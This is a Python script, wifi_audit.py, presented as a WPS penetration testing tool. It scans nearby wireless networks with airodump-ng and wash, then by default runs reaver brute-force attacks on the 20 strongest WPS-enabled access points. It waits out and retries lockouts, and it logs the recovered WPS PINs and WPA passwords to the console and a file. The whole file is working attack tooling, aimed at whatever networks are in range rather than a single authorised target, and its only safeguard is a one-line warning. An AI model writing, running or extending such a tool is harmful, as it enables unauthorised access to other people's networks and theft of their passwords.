#!/usr/bin/env python3
"""
wifi_audit.py

Active WiFi WPS penetration testing tool.

Phase 1: Runs airodump-ng (60s) and wash to scan for WPS-enabled networks
Phase 2: Attacks top 20 WPS-enabled targets by signal strength using reaver

Features:
- Live scan output
- Intelligent WPS lock detection and retry logic
- Association mode fallback (no-association -> direct)
- Real-time progress tracking
- Detailed results logging to file and console

Usage:
    # Passive scan only (no attacks):
    sudo python3 wifi_audit.py -i wlan0mon --passive

    # Active attack mode (default 60s scan):
    sudo python3 wifi_audit.py -i wlan0mon

    # Custom scan duration:
    sudo python3 wifi_audit.py -i wlan0mon -d 120

Requires:
    - airodump-ng (from aircrack-ng)
    - wash (from reaver)
    - reaver
    - iwconfig
    - python3

WARNING: Only use on networks you own or have explicit authorization to test.
         Unauthorized access to computer networks is illegal.
"""

import argparse
import csv
import subprocess
import time
import os
import sys
import re
from datetime import datetime
from dataclasses import dataclass, field
from typing import Dict, List, Optional


# ---------------------------------------------------------
# Data Classes
# ---------------------------------------------------------

@dataclass
class AccessPoint:
    bssid: str
    pwr: int
    channel: str
    essid: str
    privacy: str
    cipher: str
    auth: str
    wps: str = "?"
    locked: str = "?"
    status: str = "PENDING"


@dataclass
class AttackResult:
    target_num: int
    bssid: str
    essid: str
    channel: str
    status: str  # SUCCESS | FAILED | LOCKED | PENDING | IN_PROGRESS
    wps_pin: str
    password: str
    time_spent: float
    retries: int
    current_pin: str = "-"
    pin_progress: int = 0  # Percentage 0-100


# ---------------------------------------------------------
# Helpers
# ---------------------------------------------------------

def check_monitor_mode(interface: str) -> bool:
    """Verify interface is in monitor mode."""
    try:
        output = subprocess.check_output(
            ["iwconfig", interface],
            stderr=subprocess.STDOUT
        ).decode()
        return "Mode:Monitor" in output
    except subprocess.CalledProcessError:
        return False


def count_aps_in_csv(csv_file: str) -> int:
    """Count number of access points discovered so far in airodump CSV."""
    if not os.path.exists(csv_file):
        return 0

    count = 0
    try:
        with open(csv_file, newline="", encoding="utf-8", errors="ignore") as f:
            reader = csv.reader(f)
            in_ap_section = False

            for row in reader:
                if not row:
                    continue

                # Find the AP section header
                if row[0] == "BSSID":
                    in_ap_section = True
                    continue

                # Count APs until we hit the Station section
                if in_ap_section:
                    if len(row) < 14:
                        continue

                    bssid = row[0].strip()

                    # Stop at Station MAC section
                    if not bssid or bssid == "Station MAC":
                        break

                    # Valid AP entry
                    count += 1
    except Exception:
        return 0

    return count


def run_airodump(interface: str, duration: int, prefix: str) -> str:
    """Run airodump-ng for `duration` sec and save CSV."""
    csv_path = f"{prefix}-01.csv"

    print(f"[+] Running airodump-ng for {duration} seconds...")

    # Run airodump in background (it needs a TTY for display, so we suppress output)
    proc = subprocess.Popen(
        ["sudo", "timeout", str(duration),
         "airodump-ng", "--wps", "--write", prefix, "--output-format", "csv", interface],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    # Show progress bar while scanning
    start = time.time()
    bar_width = 40
    while proc.poll() is None:
        elapsed = int(time.time() - start)
        progress = min(elapsed / duration, 1)
        filled = int(bar_width * progress)
        bar = "█" * filled + "░" * (bar_width - filled)
        percent = int(progress * 100)

        # Count SSIDs discovered so far
        ssid_count = count_aps_in_csv(csv_path)

        print(f"\r[SCAN] |{bar}| {percent}% ({elapsed}/{duration}s) | SSIDs: {ssid_count}", end="", flush=True)

        if elapsed >= duration:
            break
        time.sleep(0.5)

    proc.wait()
    print("\n[+] Finished airodump scan.")
    return csv_path


def parse_airodump_csv(csv_file: str) -> Dict[str, AccessPoint]:
    """Parse APs from airodump CSV."""
    aps = {}

    with open(csv_file, newline="", encoding="utf-8", errors="ignore") as f:
        reader = csv.reader(f)
        in_ap_section = False

        for row in reader:
            if not row:
                continue

            if row[0] == "BSSID":
                in_ap_section = True
                continue

            if in_ap_section:
                if len(row) < 14:
                    continue

                try:
                    bssid = row[0].strip()
                    channel = row[3].strip()
                    privacy = row[5].strip()
                    cipher = row[6].strip()
                    auth = row[7].strip()
                    pwr = row[8].strip()
                    essid = row[13].strip()
                    # Extract WPS data from column 14 (if available with --wps flag)
                    wps_status = row[14].strip() if len(row) > 14 else ""
                except:
                    continue

                if not bssid or bssid == "Station MAC":
                    break

                pwr = int(pwr) if pwr not in ("", "NA") else -999

                # Parse WPS status from airodump --wps output
                # Possible values: "WPS" (enabled), "No" (disabled), "Locked"/"Lck" (locked), "" (unknown)
                if wps_status == "WPS":
                    wps = "Yes"
                    locked = "No"
                elif wps_status in ["Locked", "Lck"]:
                    wps = "Yes"
                    locked = "Yes"
                elif wps_status == "No":
                    wps = "No"
                    locked = "No"
                else:
                    wps = "?"
                    locked = "?"

                aps[bssid] = AccessPoint(
                    bssid=bssid,
                    pwr=pwr,
                    channel=channel,
                    essid=essid,
                    privacy=privacy,
                    cipher=cipher,
                    auth=auth,
                    wps=wps,
                    locked=locked,
                )

    return aps


def run_wash(interface: str, duration: int = 120) -> Dict[str, Dict[str, str]]:
    """Run wash and collect WPS + Locked data."""
    print(f"[+] Running wash for {duration} seconds (WPS lock validation)...")

    # Run wash in background
    proc = subprocess.Popen(
        ["timeout", str(duration), "wash", "-i", interface],
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL
    )

    # Show progress bar while scanning
    start = time.time()
    bar_width = 40

    while proc.poll() is None:
        elapsed = int(time.time() - start)
        progress = min(elapsed / duration, 1)
        filled = int(bar_width * progress)
        bar = "█" * filled + "░" * (bar_width - filled)
        percent = int(progress * 100)
        print(f"\r[WASH] |{bar}| {percent}% ({elapsed}/{duration}s)", end="", flush=True)

        if elapsed >= duration:
            break
        time.sleep(0.5)

    proc.wait()
    print()  # New line after progress bar

    # Get the output
    try:
        output, _ = proc.communicate(timeout=5)
        output = output.decode()
    except:
        print("[!] wash failed or interface busy.")
        return {}

    wps_data = {}

    for line in output.splitlines():
        if ":" not in line or "BSSID" in line:
            continue

        parts = line.split()
        if len(parts) < 6:
            continue

        bssid = parts[0]
        wps_ver = parts[3]
        locked = parts[4]

        wps_data[bssid] = {
            "wps": wps_ver,
            "locked": locked,
        }

    return wps_data


def detect_wps_lock(output_line: str) -> bool:
    """Detect if reaver output indicates WPS lock."""
    lock_patterns = [
        "WARNING: Failed to associate",
        "WPS transaction failed",
        "Detected AP rate limiting",
        "Receive timeout occurred",
        "WPS transaction failed (code: 0x03)"
    ]
    return any(pattern in output_line for pattern in lock_patterns)


def wait_with_countdown(seconds: int, reason: str = "WPS lock detected"):
    """Display countdown timer."""
    print(f"\n[!] {reason}, waiting {seconds // 60} minutes...")
    end_time = time.time() + seconds

    while time.time() < end_time:
        remaining = int(end_time - time.time())
        mins, secs = divmod(remaining, 60)
        print(f"\r[WAIT] {mins:02d}:{secs:02d} remaining...", end="", flush=True)
        time.sleep(1)

    print("\n[+] Resuming attack...")


def update_targets_table(results: List[AttackResult], stats: Dict):
    """
    Update and display the fixed targets table at top of screen.
    This shows all targets with their current status and progress.
    """
    # Move cursor to home position and clear screen
    print("\033[2J\033[H", end="", flush=True)

    # Header
    print("=" * 120)
    print("=== WiFi WPS Attack Progress ===")
    print("=" * 120)

    total = stats['total']
    completed = stats['completed']
    percent = int((completed / total) * 100) if total > 0 else 0

    print(f"Overall Progress: [{completed}/{total}] ({percent}%) | Success: {stats['success']} | Failed: {stats['failed']} | Locked: {stats['locked']}")
    print("=" * 120)

    # Table header
    print(f"{'#':<3} | {'ESSID':<20} | {'BSSID':<17} | {'Session':<12} | {'Result/Progress':<55}")
    print("-" * 120)

    # Table rows
    for result in results:
        num = f"{result.target_num}"
        essid = result.essid[:20]
        bssid = result.bssid

        # Session status
        if result.status == "PENDING":
            session = "Pending"
        elif result.status == "IN_PROGRESS":
            session = "In Progress"
        elif result.status in ["SUCCESS", "FAILED", "LOCKED"]:
            session = "Completed"
        else:
            session = result.status

        # Result/Progress column
        if result.status == "PENDING":
            progress = "-"
        elif result.status == "IN_PROGRESS":
            if result.current_pin != "-":
                progress = f"Testing PIN: {result.current_pin} | Progress: {result.pin_progress}%"
            else:
                progress = "Initializing attack..."
        elif result.status == "SUCCESS":
            progress = f"SUCCESS | PIN: {result.wps_pin} | Pass: {result.password}"
        elif result.status == "LOCKED":
            progress = f"LOCKED (WPS rate limiting detected, max retries reached)"
        elif result.status == "FAILED":
            progress = f"FAILED (no WPS PIN found)"
        else:
            progress = result.status

        print(f"{num:<3} | {essid:<20} | {bssid:<17} | {session:<12} | {progress:<55}")

    print("=" * 120)
    print("\n=== Live Reaver Output ===\n")


def run_reaver_attack(target: AccessPoint, interface: str, result_obj: AttackResult,
                      stats: Dict, all_results: List[AttackResult],
                      max_retries: int = 10, verbose: bool = False) -> AttackResult:
    """
    Run reaver against a single target with lock detection/retry logic.
    Updates result_obj in real-time for live progress display.
    """
    start_time = time.time()
    retry_count = 0
    use_no_association = True

    print(f"[+] Starting attack on {target.essid} ({target.bssid})")

    while retry_count <= max_retries:
        # Build reaver command
        cmd = [
            "reaver",
            "-i", interface,
            "-b", target.bssid,
            "-c", target.channel,
            "-d", "3",
            "-vv"
        ]

        if use_no_association:
            cmd.append("-N")
            print(f"[*] Attempt {retry_count + 1}/{max_retries + 1} (no-association mode)")
        else:
            print(f"[*] Attempt {retry_count + 1}/{max_retries + 1} (direct association mode)")

        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True
            )

            last_progress_time = time.time()
            wps_pin = None
            password = None
            locked = False
            association_failed = False
            pins_tried = 0
            total_pins = 11000  # Approximate total WPS PINs to try

            # Monitor output
            while True:
                line = proc.stdout.readline()
                if not line and proc.poll() is not None:
                    break

                if line:
                    # Determine if we should print this line based on verbose mode
                    should_print = verbose

                    # Always print important lines regardless of verbose mode
                    important_keywords = [
                        "[+]", "[!]", "WPS PIN", "WPA PSK", "WARNING",
                        "Failed to associate", "rate limiting", "Detected AP"
                    ]

                    if any(keyword in line for keyword in important_keywords):
                        should_print = True

                    if should_print:
                        print(line.rstrip())

                    # Extract current PIN being tested
                    pin_match = re.search(r"Trying pin[:\s]+['\"]?(\d{8})['\"]?", line, re.IGNORECASE)
                    if pin_match:
                        current_pin = pin_match.group(1)
                        result_obj.current_pin = current_pin
                        pins_tried += 1
                        result_obj.pin_progress = min(int((pins_tried / total_pins) * 100), 99)

                        # Update table every 10 PINs to avoid excessive redraws
                        if pins_tried % 10 == 0:
                            update_targets_table(all_results, stats)

                    # Check for success
                    if "[+] WPS PIN:" in line:
                        match = re.search(r"WPS PIN: '(\d+)'", line)
                        if match:
                            wps_pin = match.group(1)
                            result_obj.wps_pin = wps_pin
                            result_obj.pin_progress = 100
                            last_progress_time = time.time()
                            update_targets_table(all_results, stats)

                    if "[+] WPA PSK:" in line:
                        match = re.search(r"WPA PSK: '(.+)'", line)
                        if match:
                            password = match.group(1)
                            result_obj.password = password
                            last_progress_time = time.time()
                            update_targets_table(all_results, stats)

                    # Check for lock
                    if detect_wps_lock(line):
                        locked = True

                    # Check for association failure
                    if "Failed to associate" in line or "WARNING: Failed to associate" in line:
                        association_failed = True

                    # Any progress resets timer
                    if any(indicator in line for indicator in ["Trying pin", "Sending", "Received"]):
                        last_progress_time = time.time()

                # Check if stuck (no progress for 60 seconds)
                if time.time() - last_progress_time > 60:
                    print("[!] No progress for 60 seconds, assuming locked")
                    locked = True
                    proc.kill()
                    break

            proc.wait()

            # Check if we succeeded
            if wps_pin:
                elapsed = time.time() - start_time
                print(f"[+] SUCCESS! WPS PIN: {wps_pin}")
                if password:
                    print(f"[+] Password: {password}")

                result_obj.status = "SUCCESS"
                result_obj.wps_pin = wps_pin
                result_obj.password = password or "-"
                result_obj.time_spent = elapsed
                result_obj.retries = retry_count
                result_obj.pin_progress = 100
                update_targets_table(all_results, stats)
                return result_obj

            # Handle association failure - switch modes
            if association_failed and use_no_association:
                print("[!] No-association mode failed, switching to direct association")
                use_no_association = False
                continue

            # Handle WPS lock
            if locked:
                retry_count += 1
                if retry_count <= max_retries:
                    wait_with_countdown(300, "WPS lock detected")  # 5 minutes
                    use_no_association = True  # Reset to no-association for retry
                else:
                    print(f"[!] Max retries ({max_retries}) reached, target locked")
                    elapsed = time.time() - start_time
                    result_obj.status = "LOCKED"
                    result_obj.wps_pin = "-"
                    result_obj.password = "-"
                    result_obj.time_spent = elapsed
                    result_obj.retries = retry_count
                    update_targets_table(all_results, stats)
                    return result_obj
            else:
                # Failed for other reasons
                retry_count += 1
                if retry_count <= max_retries:
                    print(f"[!] Attack failed, retrying ({retry_count}/{max_retries})...")
                    time.sleep(5)

        except Exception as e:
            print(f"[!] Error during attack: {e}")
            retry_count += 1
            if retry_count <= max_retries:
                time.sleep(5)

    # Failed after all retries
    elapsed = time.time() - start_time
    result_obj.status = "FAILED"
    result_obj.wps_pin = "-"
    result_obj.password = "-"
    result_obj.time_spent = elapsed
    result_obj.retries = retry_count
    update_targets_table(all_results, stats)
    return result_obj


def print_table(aps: List[AccessPoint]):
    """Pretty table."""
    headers = [
        ("#", 3), ("PWR", 4), ("CH", 3),
        ("BSSID", 17), ("ESSID", 20),
        ("ENC", 7), ("CIPH", 6), ("AUTH", 6),
        ("WPS", 5), ("LOCK", 5), ("STATUS", 10),
    ]

    print("\n=== WiFi Passive Audit Table ===")
    print("(sorted by strongest signal)\n")

    # header
    line = "  " + "  ".join(h[0].ljust(h[1]) for h in headers)
    print(line)
    print("  " + "  ".join("-" * h[1] for h in headers))

    for i, ap in enumerate(aps, 1):
        row = [
            str(i).ljust(3),
            str(ap.pwr).ljust(4),
            ap.channel.ljust(3),
            ap.bssid.ljust(17),
            ap.essid[:20].ljust(20),
            ap.privacy.ljust(7),
            ap.cipher.ljust(6),
            ap.auth.ljust(6),
            ap.wps.ljust(5),
            ap.locked.ljust(5),
            ap.status.ljust(10),
        ]
        print("  " + "  ".join(row))


def save_results_to_file(results: List[AttackResult], interface: str, filename: str):
    """Save attack results to log file."""
    with open(filename, 'w') as f:
        f.write(f"WiFi Audit Results - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Interface: {interface}\n")
        f.write(f"Targets Scanned: {len(results)}\n")
        f.write("\n")

        for result in results:
            f.write(f"[{result.target_num}/{len(results)}] BSSID: {result.bssid} | ESSID: {result.essid} | Channel: {result.channel}\n")
            f.write(f"Status: {result.status}\n")

            if result.status == "SUCCESS":
                f.write(f"WPS PIN: {result.wps_pin}\n")
                f.write(f"Password: {result.password}\n")

            mins, secs = divmod(int(result.time_spent), 60)
            f.write(f"Time: {mins}m {secs}s\n")
            f.write(f"Retries: {result.retries}\n")
            f.write("\n")

    print(f"[+] Results saved to {filename}")


def print_results_table(results: List[AttackResult]):
    """Format and display final results table to console."""
    success_count = sum(1 for r in results if r.status == "SUCCESS")
    failed_count = sum(1 for r in results if r.status == "FAILED")
    locked_count = sum(1 for r in results if r.status == "LOCKED")

    print("\n" + "=" * 80)
    print("=== Final Attack Results ===")
    print("=" * 80)
    print(f"Total Targets: {len(results)}")
    print(f"Successful: {success_count}")
    print(f"Failed: {failed_count}")
    print(f"Locked: {locked_count}")
    print()

    print("Detailed Results:")
    print("+" + "-" * 4 + "+" + "-" * 19 + "+" + "-" * 22 + "+" + "-" * 10 + "+" + "-" * 11 + "+" + "-" * 14 + "+" + "-" * 10 + "+")
    print("| #  | BSSID             | ESSID                | Status   | WPS PIN   | Password     | Time     |")
    print("+" + "-" * 4 + "+" + "-" * 19 + "+" + "-" * 22 + "+" + "-" * 10 + "+" + "-" * 11 + "+" + "-" * 14 + "+" + "-" * 10 + "+")

    for result in results:
        mins, secs = divmod(int(result.time_spent), 60)
        time_str = f"{mins}m {secs}s"

        print(f"| {result.target_num:<2} | {result.bssid:<17} | {result.essid[:20]:<20} | {result.status:<8} | {result.wps_pin:<9} | {result.password[:12]:<12} | {time_str:<8} |")

    print("+" + "-" * 4 + "+" + "-" * 19 + "+" + "-" * 22 + "+" + "-" * 10 + "+" + "-" * 11 + "+" + "-" * 14 + "+" + "-" * 10 + "+")


# ---------------------------------------------------------
# Main
# ---------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description='WiFi WPS penetration testing tool - Scans and attacks WPS-enabled networks',
        epilog='WARNING: Only use on networks you own or have authorization to test.',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument(
        "-i", "--interface",
        required=True,
        metavar="IFACE",
        help="wireless interface in monitor mode (required)"
    )
    parser.add_argument(
        "-a", "--airodump-duration",
        type=int,
        default=480,
        metavar="SEC",
        help="airodump-ng scan duration in seconds (default: 480)"
    )
    parser.add_argument(
        "-w", "--wash-duration",
        type=int,
        default=None,
        metavar="SEC",
        help="wash scan duration in seconds (default: same as airodump duration)"
    )
    parser.add_argument(
        "-o", "--output-prefix",
        default="scan",
        metavar="PREFIX",
        help="output file prefix for scan results (default: scan)"
    )
    parser.add_argument(
        "--passive",
        action="store_true",
        help="passive scan only, no WPS attacks (default: active mode)"
    )
    parser.add_argument(
        "--verbose",
        action="store_true",
        help="show all reaver output lines (default: important lines only)"
    )
    args = parser.parse_args()

    # Check if interface is in monitor mode
    print("[*] Checking interface mode...")
    if not check_monitor_mode(args.interface):
        print(f"[!] Error: Interface {args.interface} is not in monitor mode")
        print("[!] Please enable monitor mode first (e.g., 'sudo airmon-ng start wlan0')")
        sys.exit(1)
    print(f"[+] Interface {args.interface} is in monitor mode")

    # Run airodump scan
    csv_file = run_airodump(args.interface, args.airodump_duration, args.output_prefix)
    aps = parse_airodump_csv(csv_file)

    # Use wash-duration if specified, otherwise use same duration as airodump
    wash_duration = args.wash_duration if args.wash_duration is not None else args.airodump_duration
    wps_info = run_wash(args.interface, wash_duration)

    # Merge WPS + Locked info (wash overrides airodump for more reliable lock detection)
    for bssid, ap in aps.items():
        if bssid in wps_info:
            # wash provides more reliable WPS lock detection than airodump
            ap.wps = wps_info[bssid]["wps"]
            ap.locked = wps_info[bssid]["locked"]
        # If airodump detected WPS but wash didn't find it, keep airodump's values

    # Sort strongest first (PWR closer to 0)
    sorted_aps = sorted(aps.values(), key=lambda x: x.pwr, reverse=True)

    # Display passive scan results
    print_table(sorted_aps)

    # If passive mode, stop here
    if args.passive:
        print("[*] Passive mode - no attacks will be performed")
        return

    # Filter for WPS-enabled targets that are not locked
    wps_targets = [
        ap for ap in sorted_aps
        if ap.wps != "?" and ap.locked != "Yes"
    ]

    if not wps_targets:
        print("[!] No WPS-enabled targets found")
        return

    # Take top 20
    targets = wps_targets[:20]
    print(f"\n[+] Found {len(wps_targets)} WPS-enabled targets")
    print(f"[+] Attacking top {len(targets)} targets\n")

    # Initialize progress stats
    stats = {
        'total': len(targets),
        'completed': 0,
        'success': 0,
        'failed': 0,
        'locked': 0,
        'current_target': None,
        'current_index': 0
    }

    # Initialize all results as PENDING
    results = []
    for idx, target in enumerate(targets, 1):
        results.append(AttackResult(
            target_num=idx,
            bssid=target.bssid,
            essid=target.essid,
            channel=target.channel,
            status="PENDING",
            wps_pin="-",
            password="-",
            time_spent=0.0,
            retries=0
        ))

    # Display initial table
    update_targets_table(results, stats)
    time.sleep(2)  # Give user time to see the initial state

    # Attack each target
    for idx, target in enumerate(targets, 1):
        stats['current_target'] = target
        stats['current_index'] = idx

        # Mark current target as IN_PROGRESS
        results[idx - 1].status = "IN_PROGRESS"
        update_targets_table(results, stats)

        # Run attack (pass the result object for live updates)
        result = run_reaver_attack(
            target,
            args.interface,
            results[idx - 1],
            stats,
            results,
            max_retries=10,
            verbose=args.verbose
        )

        # Update stats
        stats['completed'] += 1
        if result.status == "SUCCESS":
            stats['success'] += 1
        elif result.status == "LOCKED":
            stats['locked'] += 1
        else:
            stats['failed'] += 1

        # Final table update for this target
        update_targets_table(results, stats)

    # Display final results
    print_results_table(results)

    # Save results to file
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_filename = f"wifi_audit_results_{timestamp}.txt"
    save_results_to_file(results, args.interface, log_filename)


if __name__ == "__main__":
    main()
